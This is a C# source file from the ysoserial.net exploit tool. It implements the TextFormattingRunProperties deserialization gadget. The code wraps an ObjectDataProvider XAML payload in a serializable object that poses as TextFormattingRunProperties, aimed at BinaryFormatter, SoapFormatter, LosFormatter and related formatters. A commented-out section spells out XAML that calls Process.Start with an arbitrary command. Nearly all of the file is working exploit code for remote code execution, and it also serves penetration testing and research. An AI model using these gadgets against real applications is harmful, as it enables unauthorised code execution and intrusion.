using System;
using System.Runtime.Serialization;
using System.Collections.Generic;
using Microsoft.VisualStudio.Text.Formatting;
using ysoserial.Helpers;
using NDesk.Options;

namespace ysoserial.Generators
{
    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)
        {

        }

        string _xaml;
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            Type typeTFRP = typeof(TextFormattingRunProperties);
            info.SetType(typeTFRP);
            info.AddValue("ForegroundBrush", _xaml);
        }
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            _xaml = xaml;
        }
    }


    class TextFormattingRunPropertiesGenerator : GenericGenerator
    {
        private string xaml_url = "";

        public override string Name()
        {
            return "TextFormattingRunProperties";
        }

        public override string AdditionalInfo()
        {
            return "This normally generates the shortest payload";
        }

        public override string Finders()
        {
            return "Oleksandr Mirosh and Alvaro Munoz";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.NotBridgeButDervied };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {                
                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload of ObjectDataProvider which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
            };

            return options;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // commented for future reference (research purposes)
            /*
            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, Helpers.CommandArgSplitter.CommandType.XML, out hasArgs);
            
            String cmdPart;

            
            if (hasArgs)
            {
                cmdPart = $@"<System:String>"+ splittedCMD[0] + @"</System:String>
        <System:String>""" + splittedCMD[1] + @""" </System:String>";
            }
            else
            {
                cmdPart = $@"<System:String>" + splittedCMD[0] + @"</System:String>";
            }


            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
  xmlns:System=""clr-namespace:System;assembly=mscorlib""
  xmlns:Diag=""clr-namespace:System.Diagnostics;assembly=system"">
	 <ObjectDataProvider x:Key="""" ObjectType = ""{ x:Type Diag:Process}"" MethodName = ""Start"" >
     <ObjectDataProvider.MethodParameters>
        "+ cmdPart + @"
     </ObjectDataProvider.MethodParameters>
    </ObjectDataProvider>
</ResourceDictionary>";
            

            // This is a little bit shorter to use startinfo
            if (hasArgs)
            {
                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @""" Arguments=""" + splittedCMD[1] + @"""/>";
            }
            else
            {
                cmdPart = $@"<ProcessStartInfo FileName=""" + splittedCMD[0] + @"""/>";
            }

            string xaml_payload = @"<ResourceDictionary
  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
>
	 <ObjectDataProvider x:Key="""" MethodName=""Start"">
     <ObjectDataProvider.ObjectInstance>
        <Process xmlns=""clr-namespace:System.Diagnostics;assembly=system"">
            <Process.StartInfo>" + cmdPart + @"</Process.StartInfo>
        </Process>
     </ObjectDataProvider.ObjectInstance>
    </ObjectDataProvider>
</ResourceDictionary>";
            */

            if (xaml_url != "")
            {
                // this is when it comes from GenerateWithInit 
                inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
            }

            return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
        }

        /* this can be used easily by the plugins as well */

        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
        public static object TextFormattingRunPropertiesGadget(string cmd)
        {
            InputArgs inputArgs = new InputArgs();
            inputArgs.Cmd = cmd;
            return TextFormattingRunPropertiesGadget(inputArgs);
        }

        public static object TextFormattingRunPropertiesGadget(InputArgs inputArgs)
        {
            ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
            string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();

            if (inputArgs.Minify)
            {
                xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
            }

            TextFormattingRunPropertiesMarshal payload = new TextFormattingRunPropertiesMarshal(xaml_payload);
            return payload;
        }
    }
}
